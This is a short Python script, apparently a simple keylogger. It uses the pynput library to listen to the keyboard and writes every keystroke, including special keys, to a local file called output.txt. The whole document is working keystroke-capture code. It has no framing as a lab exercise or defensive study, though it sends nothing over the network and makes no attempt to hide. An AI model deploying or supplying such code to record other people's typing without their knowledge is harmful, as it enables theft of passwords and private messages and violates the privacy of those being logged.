from pynput import keyboard
import logging

def on_press(key):
    logging.basicConfig(filename="output.txt", level=logging.DEBUG, format="%(message)s")
    try:
        logging.log(10, str(key.char))
    except AttributeError:
        logging.log(10, str(key))

# Collect events until released
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
